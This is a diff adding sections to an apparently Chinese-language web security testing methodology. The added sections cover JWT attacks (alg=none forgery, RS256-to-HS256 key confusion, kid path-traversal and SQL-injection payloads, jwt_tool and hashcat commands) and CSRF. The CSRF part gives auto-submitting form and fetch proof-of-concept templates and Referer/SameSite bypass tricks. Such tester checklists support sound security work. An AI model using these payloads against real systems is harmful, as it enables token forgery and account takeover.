@@ -276,6 +276,25 @@ Session ID 可预测:
 python3 jwt_tool.py <JWT> -C -d rockyou.txt
 ```
 
+### 6.4 JWT 算法攻击
+
+```bash
+# === alg=none ===
+# header 改为 {"alg":"none"}，签名段置空 → payload.role 改 admin 后重放
+# 验证: 用篡改 Token 访问管理接口成功才算（仅接受 none 但无越权 → 不报）
+
+# === RS256 → HS256 混淆 ===
+# 服务端用公钥验证 HS256 → 拿公钥当 HMAC 密钥自签
+python3 jwt_tool.py <JWT> -S hs256 -k public.pem
+
+# === kid 注入 ===
+# header.kid 被拼进文件路径/SQL → 指向可控文件或注入
+{"alg":"HS256","kid":"../../../../dev/null"}        # 空密钥签名
+{"alg":"HS256","kid":"x' UNION SELECT 'secret'--"}  # SQL 注入取密钥
+
+# 自动化: jwt_tool -T (篡改) / hashcat -m 16500 (HS256 爆破)
+```
+
 ---
 
 ## 7. API 鉴权绕过
@@ -316,6 +335,50 @@ POST /api/register HTTP/1.1
 {"username":"test","password":"test123","approved":true}
 {"username":"test","password":"test123","email_verified":true}
 ```
+
+---
+
+## 8. CSRF (跨站请求伪造)
+
+> 报告门槛：仅**敏感操作**（改密码/改邮箱/绑定手机/转账/加管理员/删数据）且无有效 Token/Referer 校验时才算。登录 CSRF、登出 CSRF、只读操作 CSRF → 不报。
+
+### 8.1 检测方法
+
+```
+1. 抓敏感操作请求 → 检查有无 CSRF Token / 自定义头校验
+2. 无 Token → 删除 Referer 后重放 → 仍成功 = 存在 CSRF
+3. 有 Token → 测试: 删除 Token 是否仍通过 / 换他人 Token / Token 与 Session 不绑定 / 能否用 GET 触发
+```
+
+### 8.2 PoC 模板
+
+```html
+<!-- 基础表单 PoC（以改密码为例，验证时改无害字段如昵称） -->
+<html><body onload="document.forms[0].submit()">
+<form action="https://target.com/user/changePwd" method="POST">
+  <input type="hidden" name="newPwd" value="hacked123">
+</form></body></html>
+
+<!-- JSON 接口 CSRF（Content-Type 变形试探后端宽容解析） -->
+<script>
+fetch('https://target.com/api/changeEmail', {
+  method: 'POST', credentials: 'include',
+  headers: {'Content-Type': 'text/plain'},
+  body: '{"email":"test@example.com"}'
+})
+</script>
+```
+
+### 8.3 防护绕过
+
+- Referer 校验 → `<meta name="referrer" content="never">` 置空 / 域名包含绕过 `target.com.evil.com`
+- Token 弱校验 → 可预测 / 不校验存在性 / 与 Session 不绑定
+- SameSite=Lax → 寻找 GET 可触发的敏感操作；SameSite=None+Secure → 直接跨站可用
+
+### 8.4 CSWSH (WebSocket 劫持)
+
+WebSocket 握手仅靠 Cookie 认证且无 Origin 校验 → 等同 CSRF。
+测试: 跨域页面执行 `new WebSocket('wss://target.com/ws')`，能建立连接并收到数据 = 可劫持。
 
 ---
 ## 相关参考
